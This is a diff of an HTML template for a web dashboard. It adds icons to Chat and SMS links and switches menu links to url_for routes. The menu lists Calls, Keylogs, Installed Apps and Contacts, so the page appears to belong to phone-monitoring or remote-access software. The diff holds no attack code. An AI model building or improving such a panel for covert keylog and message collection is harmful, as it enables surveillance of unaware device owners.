@@ -18,8 +18,14 @@
             <div class="contact-header">
                 <span class="contact-name">{{ contact['name'] }}</span>
                 <div class="contact-links">
-                    <a href="{{ url_for('chat', name=contact['name']) }}" class="contact-link">Chat</a>
-                    <a href="{{ url_for('sms_thread', name=contact['name']) }}" class="contact-link">SMS</a>
+                    <a href="{{ url_for('chat', name=contact['name']) }}" class="contact-link">
+                        <i data-feather="message-square"></i>
+                        Chat
+                    </a>
+                    <a href="{{ url_for('sms_thread', name=contact['name']) }}" class="contact-link">
+                        <i data-feather="message-circle"></i>
+                        SMS
+                    </a>
                 </div>
             </div>
         </div>
@@ -27,19 +33,19 @@
     </div>
 
     <div class="menu-buttons">
-        <a href="/calls" class="menu-button">
+        <a href="{{ url_for('calls') }}" class="menu-button">
             <i data-feather="phone"></i>
             <span>Calls</span>
         </a>
-        <a href="/keylogs" class="menu-button">
+        <a href="{{ url_for('keylogs') }}" class="menu-button">
             <i data-feather="key"></i>
             <span>Keylogs</span>
         </a>
-        <a href="/installed_apps" class="menu-button">
+        <a href="{{ url_for('installed_apps') }}" class="menu-button">
             <i data-feather="grid"></i>
             <span>Apps</span>
         </a>
-        <a href="/contacts" class="menu-button">
+        <a href="{{ url_for('contacts_list') }}" class="menu-button">
             <i data-feather="users"></i>
             <span>Contacts</span>
         </a>
